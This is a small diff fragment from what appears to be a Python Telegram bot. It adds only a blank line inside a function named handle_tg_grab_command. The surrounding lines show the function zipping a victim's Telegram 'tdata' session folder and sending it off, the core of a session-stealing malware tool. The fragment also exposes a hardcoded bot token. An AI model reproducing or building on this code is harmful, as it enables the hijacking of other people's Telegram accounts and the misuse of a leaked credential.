@@ -338,6 +338,7 @@ def handle_tg_grab_command(message):
                 print(f"Error creating or sending zip file: {str(e)}")
         else:
             print("Папка 'tdata' не найдена.")
+    
     chat_id = message.chat.id
     telegram_bot_token = "7056495787:AAHkVcBQcjIMBtfoDcSCXhc8MfYQQ9MUzw8"  # Замените на ваш токен
     archive_and_send2()
